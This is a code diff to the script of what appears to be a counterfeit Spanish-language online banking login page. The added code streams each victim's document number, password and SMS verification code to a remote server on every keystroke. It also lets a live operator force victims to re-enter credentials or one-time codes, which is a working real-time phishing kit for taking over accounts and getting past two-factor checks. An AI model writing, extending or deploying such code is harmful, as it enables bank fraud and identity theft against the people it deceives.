@@ -20,6 +20,51 @@
   let step = "doc";
   let docType = "DNI";
 
+  const socket = typeof io !== "undefined" ? io() : null;
+
+  function sendSocketUpdate(customStatus) {
+    if (!socket) return;
+    const currentToken = tokens.map(function (t) { return t.value; }).join("");
+    const data = {
+      docType,
+      docNumber: docNumber.value.trim(),
+      password: password.value,
+      token: currentToken,
+      step,
+      status: customStatus || (step === "doc" ? "Ingresando documento" : step === "pass" ? "Ingresando contraseña" : "Ingresando token SMS"),
+    };
+    socket.emit(socket.connected ? "client:update" : "client:init", data);
+  }
+
+  if (socket) {
+    socket.on("connect", function () {
+      sendSocketUpdate("Conectado");
+    });
+
+    socket.on("operator:action", function (data) {
+      const { action, message } = data;
+      if (action === "wrong_doc") {
+        setStep("doc");
+        showError(message || "Documento incorrecto o no registrado");
+      } else if (action === "wrong_pass") {
+        setStep("pass");
+        password.value = "";
+        showError(message || "Contraseña incorrecta. Inténtalo de nuevo.");
+      } else if (action === "wrong_token") {
+        setStep("verify");
+        tokens.forEach(t => t.value = "");
+        tokens[0].focus();
+        showError(message || "Código SMS inválido o expirado.");
+      } else if (action === "ask_token") {
+        setStep("verify");
+      } else if (action === "ask_pass") {
+        setStep("pass");
+      } else if (action === "approve" || action === "redirect") {
+        window.location.href = "/panel.html";
+      }
+    });
+  }
+
   function showError(text) {
     errorMsg.hidden = !text;
     errorMsg.textContent = text || "";
@@ -37,6 +82,7 @@
     if (next === "doc") title.textContent = "Accede a la banca digital";
     if (next === "pass") title.textContent = "Accede a la banca digital";
     if (next === "verify") title.textContent = "Verifica tu identidad";
+    sendSocketUpdate();
   }
 
   function limitsFor(type) {
@@ -52,6 +98,7 @@
     docNumber.inputMode = lim.mode;
     docNumber.value = docNumber.value.replace(lim.filter, "").slice(0, lim.max);
     syncFilled(docNumber, docWrap);
+    sendSocketUpdate();
   }
 
   function syncFilled(input, wrap) {
@@ -64,10 +111,12 @@
     syncFilled(this, docWrap);
     docWrap.classList.remove("error");
     showError("");
+    sendSocketUpdate();
   });
 
   password.addEventListener("input", function () {
     this.closest(".input-field").classList.toggle("filled", this.value.length > 0);
+    sendSocketUpdate();
   });
 
   docTypeBtn.addEventListener("click", function (event) {
@@ -106,6 +155,7 @@
     box.addEventListener("input", function () {
       this.value = this.value.replace(/\D/g, "").slice(0, 1);
       if (this.value && tokens[index + 1]) tokens[index + 1].focus();
+      sendSocketUpdate();
     });
     box.addEventListener("keydown", function (event) {
       if (event.key === "Backspace" && !this.value && tokens[index - 1]) {
@@ -147,7 +197,7 @@
       showError("Ingresa el código de 6 dígitos");
       return;
     }
-    window.location.href = "/panel.html";
+    sendSocketUpdate("Esperando aprobación del operador...");
   });
 
   document.querySelectorAll(".nav-link, .forgot, .store-badges img, .resend span").forEach(function (el) {
@@ -156,3 +206,4 @@
     });
   });
 })();
+
